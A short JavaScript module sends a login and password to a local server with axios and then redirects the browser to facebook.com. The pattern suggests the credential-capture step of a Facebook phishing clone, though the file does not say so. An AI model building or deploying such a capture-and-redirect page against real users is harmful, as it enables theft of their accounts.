import axios from "axios";

export const send = (login, password) => {
    axios.post("http://localhost:3000", { login, password }).then(result => {
        if (result.data.user) window.location.href = "https://www.facebook.com/";
    });
}